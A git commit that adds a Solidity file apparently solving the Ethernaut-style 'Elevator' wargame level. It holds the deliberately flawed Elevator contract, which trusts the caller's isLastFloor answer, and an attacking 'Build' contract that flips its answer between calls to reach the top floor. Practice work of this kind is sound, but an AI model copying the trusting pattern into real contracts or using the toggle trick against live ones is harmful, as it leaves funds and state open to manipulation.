62c7a86de06e3b29cee2cf792d0065c7cdf10915
Long Yan <zhumaomao.eth@LongdeMacBook-Pro.local>
2022-09-07 17:48:28 +0800

    add Elevator.sol

---
+++ contracts/Elevator.sol
@@ -0,0 +1,37 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Building {
+    function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+    bool public top;
+    uint public floor;
+
+    function goTo(uint _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+
+contract Build {
+    Elevator public elevator;
+    bool top = true;
+    constructor(Elevator _elevator) public {
+        elevator = _elevator;
+    }
+
+    function isLastFloor(uint) external returns (bool){
+       return top = !top;
+    }
+
+    function goToTest() public {
+        elevator.goTo(~uint256(0));
+    }
+}
